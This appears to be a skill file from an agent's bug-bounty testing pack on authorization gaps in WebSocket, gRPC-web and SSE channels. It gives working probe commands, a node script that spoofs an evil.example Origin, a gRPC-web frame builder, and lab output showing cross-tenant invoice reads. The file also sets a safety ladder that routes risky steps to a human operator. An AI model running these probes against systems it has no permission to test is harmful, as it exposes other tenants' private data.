# Realtime Authorization — WebSocket / gRPC-web / SSE: authorized once, never again

<!-- workspace rung mapping -->

> **Rung mapping.** This file was written against a five-rung safety ladder. In this workspace those rungs are: **1** read-only · **2** write to an object _you_ own, reverted immediately · **3** bounded scale proof, 5–10 records, never a dump · **4** the same proof relocated to a UAT/OAT host · **5** anything touching a third party's object — **pause and ask d0x directly before executing**, providing the exact request, affected state and rollback plan. This is interactive routing, not a terminal state.

## Contents

- The core pattern
- Recognize it (and where the channel format is written down)
- Tooling notes that cause silent false negatives
- 1. WebSocket — message-level id / channel / tenant swap
- 2. WebSocket — cross-origin upgrade (no `Origin` check)
- 3. WebSocket — auth token in the query string
- 4. gRPC-web / Connect — the gateway authorized, the method did not
- 5. SSE — same gap, one stream at a time
- Oracle
- Safe ladder for realtime proofs
- Converts?
- Evidence checklist
- Handoffs

This file is the pack's single owner of realtime (WebSocket / gRPC / SSE) authorization. Safe ladder: the **Rung mapping** above.

## The core pattern

**Authorization is evaluated once, at the HTTP upgrade or at the gateway, and never re-evaluated per message, per subscription, or per method call.** The upgrade carries a cookie or bearer, so the socket "is authenticated" — and from then on the channel, room, topic, tenant or object id travels _inside the frames_, where no ownership check runs. The REST twin of the same endpoint is usually correct; the socket is the forgotten interface.

This is the function+object hybrid this skill owns: the transport authenticated you, nothing authorized the object.

## Recognize it (and where the channel format is written down)

The client bundle tells you the socket URL, the message schema, and the exact channel-id format. Find them with the rg battery in the `js-source-to-sink` skill §11 — do not re-derive it here. What you are looking for:

- `new WebSocket(`, `ReconnectingWebSocket`, `socket.io`, `sockjs`, `/cable` (Rails ActionCable), `graphql-transport-ws` / `graphql-ws` (GraphQL subscriptions), `@improbable-eng/grpc-web`, `@connectrpc/connect-web`;
- `new EventSource(` / `text/event-stream` (SSE);
- a first client→server frame shaped like `{"action":"subscribe","channel":"org:<uuid>:invoices"}`, `{"type":"connection_init","payload":{"authToken":"…"}}`, or ActionCable's `{"command":"subscribe","identifier":"{\"channel\":\"…\",\"id\":…}"}`;
- generated protobuf stubs — the `.Service/Method` strings in the bundle are the gRPC method list you would otherwise need reflection for.

The channel id is the object reference. Whatever shape it has (`org:<uuid>`, `user_<id>`, `tenant/<slug>/events`), you can write it yourself.

## Tooling notes

- `wscat` (5.2.0, on PATH) **exits silently when stdin is at EOF.** That is every scripted, backgrounded or agent-driven run — i.e. how this pack is normally driven. Measured on this host against a live `ws` server: stdin inherited from the shell -> 36 bytes captured; the identical command with `</dev/null` -> **0 bytes**. Whether stdout is a TTY, a pipe or a file makes no difference; stdin does. **So an empty capture from a scripted `wscat` proves nothing** — never read it as a closed boundary.
- **Always use the pty wrapper below. It is a correctness fix, not a convenience**, and it also strips the interactive `>` prompt and readline escapes:

  ```bash
  # strips \r and the readline cursor codes; requotes args safely
  wsc() { local c; c=$(printf '%q ' wscat --no-color "$@"); \
          script -qc "$c" /dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*[A-Za-z]//g'; }
  ```

  (`>` lines in the output below are wscat's own input prompt, not server data.)

- node's `ws` lives at `~/node_modules/ws`, so `require('ws')` resolves for any script under the operator's home (including `targets/<program>/gadgets/`). From outside that tree, export `NODE_PATH=$HOME/node_modules`. Verified both ways.
- `grpcurl` is **absent** and is not to be installed for this — the curl/python3 path below covers gRPC-web fully. `websocat` is absent too.
- python's `websockets` (15.0.1) is installed if a scripted client is preferred; the node client below is the one this file ships and tested.

## 1. WebSocket — message-level id / channel / tenant swap

Replay account A's upgrade verbatim, then send a subscribe/read frame naming account B's channel or object.

```bash
# negative control: no session at all -> the upgrade must be refused
wsc -c "wss://$HOST/socket" -x '{"action":"subscribe","room":"<B-channel>"}' -w 2

# baseline: A's cookie, A's own channel
wsc -c "wss://$HOST/socket" -H 'Cookie: <A-session>' \
    -x '{"action":"subscribe","room":"<A-channel>"}' -w 2

# the test: A's cookie, B's channel
wsc -c "wss://$HOST/socket" -H 'Cookie: <A-session>' \
    -x '{"action":"subscribe","room":"<B-channel>"}' -w 2
```

Executed against a local `ws` lab whose upgrade checks the cookie and whose subscribe handler does not re-check the tenant:

```
--- no cookie (negative control) ---
Unexpected server response: 401
--- A's cookie, A's own channel (baseline) ---
{"type":"hello","user":"alice","tenant":"tenant-a"}
> {"type":"event","room":"tenant-a","invoice":"INV-A-1001","customer":"alice@a.example","amount":12.5}
--- A's cookie, B's channel ---
{"type":"hello","user":"alice","tenant":"tenant-a"}
> {"type":"event","room":"tenant-b","invoice":"INV-B-9001","customer":"bob@b.example","amount":98099}
```

The `hello` frame still says `tenant-a` while the event body is `tenant-b`'s — the server's own identity assertion contradicting the data it just sent is the cleanest screenshot in this whole class.

Scripted version — better for evidence, multiple frames, and non-interactive runs:

```bash
mkdir -p targets/<program>/gadgets && cat > targets/<program>/gadgets/wsprobe.js <<'JS'
// usage: node wsprobe.js <ws-url> '<cookie|"">' '<json msg>' [more msgs...]
// Replays account A's upgrade, then sends messages naming account B's object.
const WebSocket = require('ws');
const [url, cookie, ...msgs] = process.argv.slice(2);
const ws = new WebSocket(url, {
  headers: Object.assign({}, cookie ? { Cookie: cookie } : {},
                         { Origin: process.env.ORIGIN || 'https://evil.example' }),
});
ws.on('unexpected-response', (_, res) => {
  console.log('UPGRADE REFUSED', res.statusCode); process.exit(1);
});
ws.on('open', () => { console.log('UPGRADE 101'); msgs.forEach(m => ws.send(m)); });
ws.on('message', d => console.log('<-', d.toString()));
ws.on('error', e => console.log('ERR', e.message));
setTimeout(() => { ws.close(); process.exit(0); }, Number(process.env.WAIT || 2000));
JS

node targets/<program>/gadgets/wsprobe.js "wss://$HOST/socket" '<A-session>' \
  '{"action":"subscribe","room":"<B-channel>"}'
```

Observed against the same lab:

```
UPGRADE 101
<- {"type":"hello","user":"alice","tenant":"tenant-a"}
<- {"type":"event","room":"tenant-b","invoice":"INV-B-9001","customer":"bob@b.example","amount":98099}
```

and with the cookie argument empty: `UPGRADE REFUSED 401` (exit 1) — the negative control, captured by the same tool.

Variants worth sending once each, all message-level:

- an id swap in a _write_ frame (`{"action":"update","id":"<B-object>"}`) — pause at rung 5 rules if it mutates anything not yours;
- a subscribe to a wildcard/broadcast channel (`*`, `all`, `org:*`, an empty string) — some brokers happily fan out everything;
- a channel id for an org you are a _former_ member of (pairs with `lifecycle-persistence.md`);
- the same frame after the REST session was logged out — the socket usually survives logout, which is session lifecycle: the `auth-flow-bypass` skill.

## 2. WebSocket — cross-origin upgrade (no `Origin` check)

WebSocket upgrades are not subject to the same-origin policy: the browser sends the cookie and the server must reject a foreign `Origin` itself. If it does not, a page on any domain opens an authenticated socket for a visiting victim.

```bash
wsc -c "wss://$HOST/socket" -H 'Cookie: <A-session>' -o https://evil.example \
    -x '{"action":"subscribe","room":"<A-channel>"}' -w 2
```

Observed on the lab (upgrade accepted with `Origin: https://evil.example`, session data returned to the foreign origin):

```
{"type":"hello","user":"alice","tenant":"tenant-a"}
> {"type":"event","room":"tenant-a","invoice":"INV-A-1001","customer":"alice@a.example","amount":12.5}
```

The `wsprobe.js` above already sends `Origin: https://evil.example` by default, so its `UPGRADE 101` is the same evidence; set `ORIGIN=https://$HOST` to get the control run.

Two things decide whether this is worth writing up: the session cookie must be `SameSite=None` (or the browser will not attach it to the cross-site upgrade — check the `Set-Cookie` on login), and the socket must return or accept something that matters. A cross-origin socket that only echoes public data is not a finding, and cookie-attribute observations on their own are not either.

## 3. WebSocket — auth token in the query string

`wss://host/socket?token=<jwt>` puts a live credential into every access log, proxy log, referrer chain and APM trace on the path.

```bash
wsc -c "wss://$HOST/socket?token=<B-token>" \
    -x '{"action":"subscribe","room":"<A-channel>"}' -w 2
```

Observed on the lab (the query-string token authenticates as B, and B then reads A's channel — both defects in one line):

```
{"type":"hello","user":"bob","tenant":"tenant-b"}
> {"type":"event","room":"tenant-a","invoice":"INV-A-1001","customer":"alice@a.example","amount":12.5}
```

On its own, token-in-URL is a **Low / defense-in-depth** observation and this pack does not report it standalone. It becomes real when you can show the token actually lands somewhere readable (an exposed log/APM endpoint, a `Referer` leak to a third party) or when it is what makes vector 1 or 2 reachable.

## 4. gRPC-web / Connect — the gateway authorized, the method did not

gRPC-web is plain HTTP/1.1 POST to `/<package>.<Service>/<Method>` with a length-prefixed frame, so `curl` is sufficient and `grpcurl` is not needed.

- frame = `0x00` + 4-byte big-endian length + protobuf message;
- `content-type: application/grpc-web+proto` (binary) or `application/grpc-web-text` (the same bytes, base64 — easier to eyeball);
- the response ends with a **trailer frame**: `0x80` + length + `grpc-status:0\r\ngrpc-message:\r\n`. `grpc-status:0` in the trailer is success even though the HTTP status is `200` either way — read the trailer, not the status.
- **reflection is usually unavailable** over grpc-web (`ServerReflectionInfo` is bidirectional-streaming, which grpc-web does not carry). Take the method names and field numbers from the generated stubs in the JS bundle instead — that is what §"Recognize it" above is for.

Build a request message (field 1 = a string id) and call the method:

```bash
python3 - <<'PY' > /tmp/frame.bin
import sys
def vi(n):
    o=b""
    while True:
        b=n&0x7f; n>>=7; o+=bytes([b|(0x80 if n else 0)])
        if not n: return o
def pb(**f):                       # f1="…" -> field 1, wire type 2 (length-delimited)
    o=b""
    for k,v in f.items():
        o+=bytes([int(k[1:])<<3|2])+vi(len(v))+v.encode()
    return o
m=pb(f1="INV-B-9001")              # <- B's object id, called with A's session
sys.stdout.buffer.write(b"\x00"+len(m).to_bytes(4,"big")+m)
PY

curl -s --data-binary @/tmp/frame.bin -H 'content-type: application/grpc-web+proto' \
  -H 'x-grpc-web: 1' -H "Cookie: <A-session>" \
  "https://$HOST/acme.Billing/GetInvoice" | xxd

# same call, base64 framing -- readable without a hex dump
base64 -w0 /tmp/frame.bin > /tmp/frame.b64
curl -s --data-binary @/tmp/frame.b64 -H 'content-type: application/grpc-web-text' \
  -H 'x-grpc-web: 1' -H "Cookie: <A-session>" \
  "https://$HOST/acme.Billing/GetInvoice" | base64 -d | strings
```

Executed against a local grpc-web lab (the HTTP gateway checks the cookie; the method never re-checks that the invoice belongs to the caller):

```
request frame:
00000000: 0000 0000 0c0a 0a49 4e56 2d42 2d39 3030  .......INV-B-900
00000010: 31                                       1

response (grpc-web+proto):
00000000: 0000 0000 250a 0a49 4e56 2d42 2d39 3030  ....%..INV-B-900
00000010: 3112 0d62 6f62 4062 2e65 7861 6d70 6c65  1..bob@b.example
00000020: 1a08 3938 3039 392e 3030 8000 0000 1e67  ..98099.00.....g
00000030: 7270 632d 7374 6174 7573 3a30 0d0a 6772  rpc-status:0..gr
00000040: 7063 2d6d 6573 7361 6765 3a0d 0a         pc-message:..

response (grpc-web-text, decoded):
INV-B-9001
bob@b.example
98099.00
grpc-status:0
grpc-message:
```

The authorization here typically lives only in the HTTP gateway (Envoy, an ingress, an API gateway) that fronts the gRPC service: it validates the JWT/cookie and maps the path, then forwards. The service behind it trusts anything the gateway let through — so the method's own object check is often absent, and the gateway can frequently be reached with a _different_ path prefix or on a second host found in the JS. Cross-check for the sibling that enforces: a method that returns `grpc-status:7` (PERMISSION_DENIED) for the same session is the convincer.

## 5. SSE — same gap, one stream at a time

`EventSource` streams are ordinary GETs, so `curl -N` is the whole toolkit; the channel/topic is in the query string or path and is the object reference.

```bash
curl -s -o /dev/null -w '%{http_code}\n' -N "https://$HOST/events?channel=<B-channel>"     # no session
curl -sN --max-time 3 -H "Cookie: <A-session>" "https://$HOST/events?channel=<A-channel>"  # baseline
curl -sN --max-time 3 -H "Cookie: <A-session>" "https://$HOST/events?channel=<B-channel>"  # the test
```

Observed on the lab:

```
401
data: {"invoice": "INV-A-1001", "customer": "alice@a.example", "amount": "12.50"}
data: {"invoice": "INV-B-9001", "customer": "bob@b.example", "amount": "98099.00"}
```

`--max-time` is required: an SSE response never ends on its own.

## Oracle

**Proves it**: a frame/event/message you received contains **another tenant's or user's field values** — a distinct invoice id, email, amount, name, object id that belongs to the second account and is absent from your own baseline. Show the baseline frame and the cross-tenant frame side by side; the difference in the field values is the proof.

**Does not prove it**:

- "the socket stayed open" / `101 Switching Protocols` — the upgrade is _authentication_, and it succeeding is expected;
- a subscribe frame that is acknowledged (`{"type":"subscribed"}`) but never delivers data — the broker accepted a name, nothing crossed the boundary;
- an empty result set for the foreign channel (the correct behaviour);
- an error frame naming the other tenant (that is enforcement, plus at most an enumeration oracle);
- silence — **but only once you have ruled out the tool.** A scripted `wscat` with stdin at EOF returns an empty capture no matter what the server sent, so an empty result is meaningless unless the run went through the pty wrapper. Confirm the SAME wrapped command against your OWN channel returns frames first; only then is an empty foreign-channel result enforcement rather than a broken harness.

Also capture the **enforcing sibling**: the same object over REST/GraphQL returning `403` for the same session. Socket allows / REST denies is the single most convincing pair a triager can re-run.

## Safe ladder for realtime proofs

- **Rung 1–2 covers this class.** Use two accounts/tenants **you own** and prove the cross-read with one frame each way. That is a complete proof.
- Do **not** subscribe to a real user's or real tenant's channel on prod to "show it works" — a broadcast channel can push a live stream of strangers' records into your terminal, which is rung 3 bulk PII and will be blocked (correctly). If a channel id you found belongs to a real org, use your own second org instead and state the equivalence.
- Write frames (`update`, `delete`, `publish`) on anything that is not yours: rung 5, ask d0x directly before executing, revert.
- Close the socket as soon as the proving frame arrives. A subscription left open keeps receiving.
- If the program restricts privacy/cross-tenant testing to UAT/OAT, do the cross-tenant frame there and, on prod, stop at the baseline that shows the channel id is caller-controlled.

## Converts?

- **High** — the realistic landing spot when a cross-tenant/cross-user read is proven with distinct PII or business data in the frame, and the REST sibling denies the same session. It is the same anchor as any cross-tenant object read (the `validator` agent).
- **Critical** — only with real escalation on top: the socket streams _all_ tenants (a broadcast/wildcard channel proven with a bounded read plus the schema), or a write frame performs a privileged action for another tenant, or the stream carries credentials/tokens.
- **Medium** — the foreign channel returns non-sensitive metadata (names, counts, presence/typing indicators), or the gap is only demonstrable between two of your own orgs on a low-value object.
- **Low / closed as informative** — and this is what gets these reports rejected: token-in-query-string alone; a cross-origin upgrade with no sensitive data and no `SameSite=None` cookie to make it reachable; "the WebSocket has no authentication" where the data behind it is public; a `101` with no frame evidence; an acknowledgement frame presented as a cross-tenant read.

The whole difference between High and closed-informative in this class is whether you pasted a frame containing the other tenant's field values.

## Evidence checklist

- the upgrade/connect request in full (URL, `Origin`, `Cookie`/`Authorization`, subprotocol) for each actor;
- the negative control: the same upgrade with no session → refused (`401`), captured by the same tool;
- the baseline frame for your own channel;
- the cross-tenant frame, with the distinct field values highlighted and PII redacted (`id=<uuid>` form preserved so it is reproducible);
- the enforcing sibling (REST/GraphQL `403`, or a gRPC `grpc-status:7`) for the same session;
- for gRPC-web, the trailer frame showing `grpc-status:0`;
- which account owns which channel id, and that both accounts are the operator's;
- socket closed / subscription cancelled after the proof.

## Handoffs

- the `js-source-to-sink` skill §11 — finding the socket URL, the message schema and the channel-id format in the bundle (it owns the discovery battery; this file owns the exploitation).
- the `tenant-isolation` skill — when the boundary crossed is an org/tenant rather than a role, the tenant chain and its cost-amplification twin live there.
- `idor-bola` — only if the residue is a pure id swap in a frame with the transport authorization intact.
- `graphql-api.md` — GraphQL subscriptions over `graphql-transport-ws`: the schema, introspection and alias-batch half belongs there; the per-subscription authorization gap stays here.
- `lifecycle-persistence.md` — a socket that keeps delivering after the membership, role or seat that authorized it was removed.
- the `auth-flow-bypass` skill — a socket that survives logout, session revocation or a password change.
- `validation` — mandatory before reporting any cross-tenant realtime read.
